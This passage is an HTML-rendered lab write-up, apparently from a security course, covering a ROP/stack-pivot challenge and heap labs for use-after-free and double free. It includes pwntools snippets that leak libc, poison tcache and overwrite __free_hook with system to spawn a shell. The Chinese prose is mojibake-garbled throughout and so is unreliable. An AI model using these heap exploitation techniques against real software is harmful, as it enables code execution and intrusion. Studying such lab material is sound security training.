é€™å€‹è¦å›åˆ°å‹•æ…‹å¯¦éš›åŸ·è¡Œçš„æ™‚å€™æ˜¯æ€éº¼å‘¼å«çš„(å¦‚ä¸‹åœ–)ï¼Œé€™ä¸€é¡Œæœ‰è¶£çš„åœ°æ–¹åœ¨é€™é‚Šï¼Œç†è«–ä¸Šæˆ‘å€‘æ˜¯å›åˆ°main+291ï¼Œè®“ä»–fetch n2çš„å€¼çµ¦RAXï¼Œä½†å¦‚æœæˆ‘ç›´æ¥è·³åˆ°main+298ï¼Œä¸¦ä¸”åˆ©ç”¨ropæŠŠraxè®Šå¤§ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿæœ‰ä¸€æ¨£çš„æ•ˆæœ
<a href=#R-image-95c0c5ae34548936d3643a3f2db0816f class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Syoe0OTHp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-95c0c5ae34548936d3643a3f2db0816f><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Syoe0OTHp.png></a></p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>extend_payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    canary,
</span></span><span style=display:flex><span>    bss_addr_flag,
</span></span><span style=display:flex><span>    pop_rax_ret, <span style=color:#ae81ff>400</span>,
</span></span><span style=display:flex><span>    main_fn_addr <span style=color:#f92672>+</span> <span style=color:#ae81ff>298</span>,
</span></span><span style=display:flex><span>)</span></span></code></pre></div><p>æ­¤æ™‚æˆ‘å€‘å°±ä¸éœ€è¦é‚£éº¼å¤šçš„gadgetå¹«åŠ©å®Œæˆè©²ç›®æ¨™</p></li><li><p>å‰©ä¸‹çš„open / read / writeå°±å’Œlabå·®ä¸å¤š</p></li></ol><p>:::success
æˆªè‡³ç›®å‰ç‚ºæ­¢ï¼Œæˆ‘å€‘çš„æµç¨‹æ˜¯</p><ol><li>è¨­æ³•åˆ©ç”¨overflowæ”¹è®Šn2çš„æ•¸å€¼ï¼Œä½¿æˆ‘å€‘èƒ½å¤ è¼¸å…¥æ›´å¤šshell code</li><li>å…ˆåˆ©ç”¨ç¬¬ä¸€æ¬¡çš„writeè¼¸å…¥stackä¸Šçš„é‡è¦è³‡è¨Š</li><li>å› ç‚ºn2ç©ºé–“é‚„æ˜¯å¤ªå°ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å…ˆæ“´å¤§èƒ½å¤ å¯«å…¥çš„ç©ºé–“ï¼Œä¹Ÿå°±æ˜¯å…ˆåˆ©ç”¨ç¬¬ä¸€æ¬¡çš„stack pivotæŠŠshellcodeå¯«ä¸Šå»â†’main+291</li><li>åŸ·è¡Œshellcodeå¾Œï¼Œä½¿raxè®Šå¤§å†è·³å›å»main+298</li><li>å¯«å…¥çœŸæ­£çš„open / read / writeè®€å‡ºflag
:::</li></ol><p>:::warning
æ³¨æ„äº‹é …:</p><ol><li>canary
å› ç‚ºä»–æœ‰é–‹stack protectionï¼Œæ‰€ä»¥ä¸€å®šè¦å°å¥½canaryåœ¨stackä¸Šçš„ä½ç½®ï¼Œå¯ä»¥ç”¨å‹•æ…‹å»çœ‹ï¼Œä¾ç…§é€™ä¸€é¡Œçš„ç‹€æ³ï¼Œä»–æ˜¯æœƒåœ¨rbp+0x40çš„åœ°æ–¹</li><li>libc version
é€™ä¸€é¡Œå› ç‚ºè¦leak libcçš„base addressï¼Œä¸¦ä¸”åˆ©ç”¨ROP gadgeté”åˆ°syscallçš„ç›®çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦ç¢ºå®šremote serverä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯å“ªä¸€å€‹ï¼Œå…‰çŸ¥é“å¤§çš„ç‰ˆæœ¬è™Ÿæ˜¯æœ‰å¯èƒ½æœƒå¤±æ•—çš„ï¼Œå› ç‚ºåƒæˆ‘localç«¯åˆ°æœ€å¾Œæœ‰æˆåŠŸï¼Œä½†è·‘åœ¨remoteå°±çˆ›æ‰äº†ï¼Œå’Œ@davidå­¸é•·è¨è«–éå¾Œçš„çµæœå°±æ˜¯libc versionæœ‰å•é¡Œï¼Œå¯¦éš›ç”¨dockerå»çœ‹å½¼æ­¤çš„å·®ç•°å°±æœƒç™¼ç¾ï¼Œå³é‚Šæ˜¯æˆ‘çš„â†’22.04.3ï¼Œè€Œå·¦é‚Šæ˜¯å¯¦éš›remoteçš„dockeré–‹å‡ºä¾†çš„çµæœâ†’22.04.2ï¼Œæ‰€ä»¥æˆ‘çš„ä½œæ³•æ˜¯æŠŠdockerä¸­çš„æ±è¥¿æ‹‰å‡ºä¾†å†ä½¿ç”¨ï¼ŒåŒ…å«åœ¨localç«¯ä½¿ç”¨ä»¥åŠæ‰¾gadget
<a href=#R-image-321d59f0cd81aee5ea54a692f44fbf6e class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ByiMMYTHa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-321d59f0cd81aee5ea54a692f44fbf6e><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ByiMMYTHa.png></a><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ docker cp /lib/x86_64-linux-gnu/libc.so.6 /mnt/d/Downloads/</span></span></code></pre></div></li><li>IO problem
é€™å€‹å•é¡Œä¹Ÿæ˜¯å¾ˆå¼”è©­ï¼Œæœƒç™¼ç¾æˆ‘åœ¨æœ€å¾Œä¸€å€‹sendä¹‹å‰é‚„æœ‰ä¸€å€‹raw_input()ï¼Œå¦‚æœæ‹¿æ‰çš„è©±åœ¨remoteä¸€æ¨£æœƒçˆ›æ‰ï¼Œé€™æœ‰å¯èƒ½æ˜¯IOä¹‹é¡çš„å•é¡Œï¼Œä½†ç¸½ä¹‹ä¸€å®šè¦åŠ 
:::</li></ol><h2 id=lab-uaf>Lab-UAF</h2><p>Flag: <code>flag{https://www.youtube.com/watch?v=CUSUhXqThjY}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-12>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>é€™æ˜¯å€‹ç¶“å…¸çš„è¡¨å–®é¡Œï¼Œç¸½å…±æœ‰å››ç¨®command(è¨»å†Šentity / åˆªé™¤entity / è¨­å®šentity name / è§¸ç™¼entitiy function pointer)ï¼Œé€™ç¨®é¡Œç›®å› ç‚ºæ ¼å±€æ¯”è¼ƒå¤§ï¼Œæ‰€ä»¥æˆ‘éƒ½æœƒå…ˆçœ‹å“ªè£¡æœ‰mallocæˆ–æ˜¯freeï¼Œé¦–å…ˆ</p><ul><li>==è¨»å†Šentity==â†’malloc</li><li>==è¨­å®šentity name==â†’malloc</li><li>==åˆªé™¤entity==â†’free</li></ul><p>ç„¶å¾Œè§€å¯Ÿä¸€ä¸‹é¡Œç›®ä¸€é–‹å§‹æœƒçµ¦æˆ‘å€‘systemçš„addressï¼Œå’Œä¸€é–‹å§‹çš„heap addressï¼Œä¸¦ä¸”æœ€å¾Œå¯ä»¥è§¸ç™¼entityçš„function pointerï¼Œæ‰€ä»¥ç›®æ¨™å¾ˆæ¸…æ¥š
==è¨­æ³•æŠŠfunction pointerçš„åœ°å€æ”¹æˆsystemï¼Œä¸¦ä¸”eventçš„éƒ¨åˆ†æ”¹æˆå„²å­˜<code>/sh\x00</code>çš„åœ°å€==
æœ€å¾Œåªè¦triggerå°±æœƒè‡ªå‹•é–‹ä¸€å€‹shellçµ¦æˆ‘å€‘</p><hr><p>æ ¹æ“šbackgroundï¼Œæˆ‘å€‘è¦åˆ©ç”¨çš„æ¼æ´å°±æ˜¯æœ€å¾Œä¸€å€‹ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ç›¸åŒçš„å¤§å°ï¼ŒæŠŠå·²ç¶“freeæ‰çš„éƒ¨åˆ†æ‹¿å›ä¾†åŠ å·²åˆ©ç”¨</p><ol><li>å…ˆè¨»å†Šå…©å€‹entity(0å’Œ1)ï¼Œç¬¬0å€‹æ˜¯è¦åˆ©ç”¨çš„éƒ¨åˆ†
<a href=#R-image-c0e222a5afac9e9c686849baa3f90a55 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/ryvTkuESp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c0e222a5afac9e9c686849baa3f90a55><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/ryvTkuESp.png></a></li><li>æŠŠ<code>/sh\x00</code>å¯«ä¸Šentity
<a href=#R-image-300489bd62f816b063e984a69407c2b5 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/S1Rmxu4Ha.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-300489bd62f816b063e984a69407c2b5><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/S1Rmxu4Ha.png></a></li><li>åˆªé™¤entity 0
<a href=#R-image-30b5c9697f6d2d5cbcf31d223a7324f8 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkQKxuVB6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-30b5c9697f6d2d5cbcf31d223a7324f8><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkQKxuVB6.png></a></li><li>è¨­å®šsystemçš„function pointer
é€™è¦ç‰¹åˆ¥èªªæ˜ï¼Œå‰é¢ä¸‰å€‹æ­¥é©Ÿéƒ½ç®—æ˜¯æ­£å¸¸çš„æ­¥é©Ÿï¼Œè€Œå¦‚æœæˆ‘å€‘è¨­å®šentityçš„nameï¼Œæ­¤æ™‚ç³»çµ±æœƒmallocä¸€å¡Šç©ºé–“å¯«æˆ‘å€‘è¼¸å…¥çš„entity nameï¼Œä»¥é€™ä¸€é¡Œä¾†èªªå°±æœƒæ˜¯entity 0(åªè¦å¤§å°è¨­å®šçš„ä¸€æ¨£å°±å¥½)ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥å¯«å…¥åŒ…å«system addresså’Œ<code>/sh\x00</code>çš„ä½ç½®ï¼Œæœ€å¾Œå†ä»¥entity 0çš„èº«åˆ†triggerè©²function pointerå°±å¯ä»¥æ‹¿åˆ°shelläº†
<a href=#R-image-35730b7f004d876f5231172f6dad2c2c class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rkM7Eu4r6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-35730b7f004d876f5231172f6dad2c2c><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rkM7Eu4r6.png></a><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gefâ¤  x/gx 0x00007f706a449d70
</span></span><span style=display:flex><span>0x7f706a449d70 &lt;__libc_system&gt;: 0x74ff8548fa1e0ff3
</span></span><span style=display:flex><span>gefâ¤  x/s 0x560bb1125300
</span></span><span style=display:flex><span>0x560bb1125300: <span style=color:#e6db74>&#34;sh&#34;</span></span></span></code></pre></div></li><li>æœ€å¾Œæˆ‘å€‘å†åˆ©ç”¨entity 0çš„åç¾©ï¼Œtrigger function pointerï¼Œå°±æ‹¿åˆ°shelläº†</li></ol><h2 id=lab-double-free>Lab-Double Free</h2><p>Flag: <code>flag{a_iU8YeH944}</code></p><h3 id=è§£é¡Œæµç¨‹èˆ‡æ€è·¯-13>è§£é¡Œæµç¨‹èˆ‡æ€è·¯</h3><p>:::warning
Run On Ubuntu 20.04
:::
é€™ä¸€é¡Œæœ‰å¾ˆå¤šç¨®æ–¹å¼å¯ä»¥æ‹¿åˆ°shellï¼Œä¸éåŸç†éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œå‰ç½®ä½œæ¥­éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œä¹Ÿå°±æ˜¯è¦åˆ©ç”¨UAFå»leakå‡ºlibc addressï¼Œæ¥è‘—ç®—å‡º<code>__free_hook</code>ä»¥åŠ<code>system</code>çš„ä½å€ï¼Œæ¥è‘—æƒ³è¾¦æ³•æŠŠ<code>system</code>å¯«åˆ°<code>__free_hook</code>çš„ä½å€ï¼Œæ­¤æ™‚å°±æœ‰å…©ç¨®æ–¹å¼å¯ä»¥å¯«ï¼Œä¸€ç¨®æ˜¯åˆ©ç”¨æ­¤æ¬¡å­¸åˆ°çš„double freeï¼ŒæŠŠå€¼å¯«åˆ°æœ€å¾Œä¸€å€‹åœ¨tcacheçš„free chunkï¼Œè“‹æ‰ä»–çš„fdï¼Œæ¥è‘—å°±å¯ä»¥ç”¨add_noteæŠŠtcacheçš„å€¼è¦å›ä¾†ï¼Œä¸¦å¯«systemçš„addressé€²åˆ°__free_hookï¼›å¦ä¸€ç¨®æ–¹å¼å°±æ¯”è¼ƒç°¡å–®ï¼Œä¹Ÿå°±æ˜¯æŠŠfree chunkçš„fdåˆ©ç”¨UAFçš„ç‰¹æ€§æ”¹æ‰ï¼Œä¸¦ä¸”ç›´æ¥add_noteæŠŠæ±è¥¿å¾tcacheè¦å›ä¾†ï¼Œä¹‹å¾Œå°±ä¸€æ¨£å¯«system_addrï¼Œå¾Œfreeæ‰ä¸€å€‹å¸¶æœ‰/bin/shçš„chunkï¼Œæ­¤æ™‚å°±æœƒé–‹ä¸€å€‹shellçµ¦æˆ‘å€‘äº†</p><h4 id=å‰ç½®ä½œæ¥­-leak-libc-address>å‰ç½®ä½œæ¥­: Leak Libc Address</h4><p>é—œæ–¼é€™ä¸€é»å¯ä»¥åƒè€ƒ<a href=https://hackmd.io/@SBK6401/SJWc9v4Bp#%E5%A6%82%E4%BD%95%E7%94%A8UAF-leak-libc-address rel=external target=_blank>å¦‚ä½•ç”¨UAF leak libc address?</a>ï¼Œæ–¹æ³•éƒ½ä¸€æ¨£ï¼Œé¦–å…ˆè¦æƒ³è¾¦æ³•è®“free chunké€²åˆ°unsorted binä¸­(æœ€ç°¡å–®çš„æ–¹æ³•å°±æ˜¯è¨­å®šè¶…é0x410çš„ç©ºé–“)ï¼Œæ¥è‘—å› ç‚ºmallocçš„æ™‚å€™æ²’æœ‰å¯¦ä½œæ¸…ç©ºåŸæœ¬çš„è³‡æ–™ï¼Œå°è‡´æˆ‘å€‘å¯ä»¥leakå…¶ä¸­æœ‰é—œlibc sectionçš„è³‡è¨Šã€‚åº•ä¸‹çš„è¨­å®šæ„æ€æ˜¯æˆ‘å€‘å…ˆè¨­å®šä¸‰å€‹notesï¼Œ#14çš„æ„æ€æ˜¯ä¸è¦è®“#13è¢«freeæ‰çš„æ™‚å€™è¢«consolidateç”¨çš„ï¼Œæ¥è‘—æˆ‘å€‘æŠŠå‰å…©å€‹freeæ‰ï¼Œçµæœå¦‚ä¸‹
<a href=#R-image-f876987e064faf1880d290f4c6a95234 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/r14opZfL6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f876987e064faf1880d290f4c6a95234><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/r14opZfL6.png></a>
æœƒç™¼ç¾#12å’Œ#13è¢«consolidateåœ¨ä¸€èµ·äº†ï¼Œæ¥è‘—æˆ‘å€‘çœ‹å…¶ä¸­çš„ä¸€äº›è³‡è¨Š
<a href=#R-image-85f79e4bd1f4f7e6a53aebde59959682 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJwX0-GIT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-85f79e4bd1f4f7e6a53aebde59959682><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJwX0-GIT.png></a>
è£¡é¢ç¢ºå¯¦å­˜è‘—libcç›¸é—œçš„è³‡è¨Šï¼Œæ¥è‘—åªè¦æŠŠé€™ä¸€å¡Šchunk mallocå‡ºå»çµ¦éš¨ä¾¿ä¸€å€‹noteï¼Œæ¥è‘—è®€å…¶ä¸­çš„è³‡æ–™å°±å¯ä»¥è®€å‡ºlibc addressäº†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>13</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>13</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>0x420</span>)
</span></span><span style=display:flex><span>read_note(<span style=color:#ae81ff>12</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>leak_libc <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> leak_libc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x1ed0e0</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>free_hook <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1eee48</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Leak Libc = </span><span style=color:#e6db74>{</span>hex(leak_libc)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Libc Base = </span><span style=color:#e6db74>{</span>hex(libc_base)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;System Address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Free Hook = </span><span style=color:#e6db74>{</span>hex(free_hook)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>0x420</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>)</span></span></code></pre></div><h4 id=æ–¹æ³•ä¸€-double-fee>æ–¹æ³•ä¸€: Double Fee</h4><p>æœ‰äº†libc addresså¾Œï¼Œæˆ‘å€‘è¦æƒ³è¾¦æ³•æŠŠsystem addresså¯«åˆ°<code>__free_hook</code>çš„ä½ç½®ï¼Œå¦‚æœæ˜¯è¦ç”¨double freeçš„æ–¹æ³•çš„è©±å¯ä»¥åƒè€ƒä¸Šèª²çš„è¬›ç¾©:
<a href=#R-image-7403eb0bbec511f6c74df3e5bdab97c8 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJNM1Mf8T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-7403eb0bbec511f6c74df3e5bdab97c8><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJNM1Mf8T.png></a></p><p>æœ€ç°¡å–®çš„æ–¹æ³•æ˜¯ï¼Œæˆ‘æŠŠtcacheå¡«æ»¿(ä¸€å®šè¦)ï¼Œç„¶å¾Œç”¨free(a)â†’free(b)â†’free(a)çš„é †åºç”¢ç”Ÿdouble free</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0xa</span>):
</span></span><span style=display:flex><span>    add_note(i, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x8</span>):
</span></span><span style=display:flex><span>    del_note(i)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>9</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>8</span>)</span></span></code></pre></div><p>æ­¤æ™‚çš„heapinfoæœƒè®Šæˆ:
<a href=#R-image-5637e04d1b5b38776a6761d008c1f430 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/H1GGgGM86.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5637e04d1b5b38776a6761d008c1f430><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/H1GGgGM86.png></a></p><p>æ¥è‘—æˆ‘å€‘æŠŠtcacheæ¸…ç©ºå¾Œå†ç¹¼çºŒadd_noteå°±æœƒæŠŠfastbinçš„free chunkæ¬åˆ°tcacheä¸­</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>8</span>, <span style=color:#ae81ff>0x18</span>)</span></span></code></pre></div><p><a href=#R-image-6ad02866ff83902b0d17b236f858b9d7 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B1ErzMM8T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6ad02866ff83902b0d17b236f858b9d7><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B1ErzMM8T.png></a></p><p>æ¥è‘—æˆ‘å€‘å¯«free_hook addressåˆ°note #8ï¼Œé€™æ¨£çš„è©±ï¼Œtcacheçš„é †åºå°±æœƒè®Šæˆä¸‹åœ–:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>write_note(<span style=color:#ae81ff>8</span>, p64(free_hook))</span></span></code></pre></div><p><a href=#R-image-971a34212d3387462de0bdaeb4925530 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rktIXGMIp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-971a34212d3387462de0bdaeb4925530><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rktIXGMIp.png></a></p><p>æ­¤æ™‚æˆ‘å€‘å°±æŠŠfree chunkè®Šæˆfree_hookçš„åœ°å€ï¼Œæˆ‘å€‘åªä¸æ–·çš„add_noteï¼Œå°±å¯ä»¥æŠŠtcacheçš„free chunkè¦å›ä¾†é€²è¡Œå¯«å…¥ï¼Œä¹Ÿå°±æ˜¯å¯«system address:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bin_sh <span style=color:#f92672>=</span> u64(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>9</span>, p64(bin_sh))
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>0x10</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>11</span>, p64(system_addr))</span></span></code></pre></div><p><a href=#R-image-5ccf1599e2cefafdf18c05066b993044 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SydnNzMIa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5ccf1599e2cefafdf18c05066b993044><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SydnNzMIa.png></a></p><p>æœ€å¾Œçš„çµæœå¦‚ä¸Šåœ–ï¼Œæœƒç™¼ç¾note #11å·²ç¶“è®Šæˆ==0x7f900aa8ae48==ï¼Œé€™å€‹å°±æ˜¯<code>__free_hook</code>çš„ä½å€ï¼Œé€²å»çœ‹ç™¼ç¾å·²ç¶“è¢«æˆ‘å€‘å¯«å…¥system addressï¼Œé€™å€‹æ™‚å€™æˆ‘å€‘åªè¦æŠŠå«æœ‰<code>/bin/sh\x00</code>çš„note #9 freeæ‰ï¼Œå°±å¯ä»¥é–‹shelläº†</p><h4 id=æ–¹æ³•äºŒ-ä¸€èˆ¬çš„å¯«å…¥>æ–¹æ³•äºŒ: ä¸€èˆ¬çš„å¯«å…¥</h4><p>é€™ä¸€å€‹æ–¹æ³•æ¯”è¼ƒæ–¹ä¾¿ï¼Œä¹Ÿå’Œdouble freeæ²’é—œä¿‚ï¼Œåæ­£æˆ‘å€‘åªè¦åˆ©ç”¨UAFçš„ç‰¹æ€§ï¼Œä¹Ÿå¯ä»¥æŠŠfree chunkçš„fdæ”¹æ‰ï¼Œå†ç”¨åƒå‰é¢çš„æ–¹æ³•å°±å¯ä»¥é–‹shell</p><p>ä¸‹é¢çš„å»ºæ§‹å°±æ˜¯å…ˆé–‹å…©å€‹noteï¼Œç„¶å¾Œfreeæ‰ï¼Œæ­¤æ™‚æˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨UAFçš„æ¼æ´æŠŠfree chunkçš„fdæ”¹æ‰ï¼Œçµæœå¦‚ä¸‹åœ–
<a href=#R-image-7f8c4de600d280f62007c623a8f1b71b class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B1ohIMz86.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-7f8c4de600d280f62007c623a8f1b71b><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B1ohIMz86.png></a></p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>add_note(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>add_note(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0x18</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>del_note(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>write_note(<span style=color:#ae81ff>1</span>, p64(free_hook) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>)</span></span></code></pre></div><p>æ¥è‘—å°±æŠŠ<code>/bin/sh\x00</code>å¯«åˆ°note #2ï¼Œæ¥è‘—å°±ä¸æ–·add_noteï¼ŒæŠŠ<code>__free_hook</code>çš„addressæ‹¿åˆ°æ‰‹ï¼Œç„¶å¾Œå†æŠŠsystem addresså¯«åˆ°<code>__free_hook</code>ï¼Œæœ€å¾ŒæŠŠå«æœ‰<code>/bin/sh\x00</code>çš„note #2 freeæ‰ï¼Œçµæœå¦‚ä¸‹åœ–:
<a href=#R-image-bd7df466b1702f6b8c081f17ebb7fae5 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkGsPGfL6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-bd7df466b1702f6b8c081f17ebb7fae5><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkGsPGfL6.png></a>
